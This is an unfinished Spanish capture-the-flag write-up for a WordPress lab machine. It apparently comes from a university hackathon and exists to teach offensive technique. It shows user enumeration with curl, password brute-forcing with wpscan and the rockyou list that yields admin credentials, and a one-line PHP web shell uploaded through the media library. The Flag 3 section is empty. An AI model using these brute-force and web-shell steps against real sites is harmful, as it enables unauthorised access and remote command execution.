# Hackaton UdG - Reto 2

## Index

- [Flag 1](#flag-1)

- [Flag 2](#flag-2)

- [Flag 3](#flag-3)


### Flag 1 

Lo primero que encontramos es en la ruta `htpp://<IP>/wp1/` así que nos encontramos ante una máquina con WordPress.

Encontramos el usuario `admin` con la comanda `curl -s -L http://<IP>/wp1/?author=1` y con esta información y mediante fuerza bruta con la herramienta `wpscan` y ejecutando el siguiente comando 

```shell
wpscan --url http://10.0.2.12/wp1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --enumerate u --disable-tls-checks > wpscan-pass.txt
``` 
sacamos las credenciales: `admin:spongebob`

> [!NOTE]
> Problema de resolución de DNS, se tuvo que añadir una línea `echo "10.0.2.12 reto02.hackaton" | sudo tee -a /etc/hosts
`

### Flag 2 

Una vez dentro del WordPress como admin y haciendo uso de la sección de Medios podemos subir una `reverse shell`

```shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

```

### Flag 3


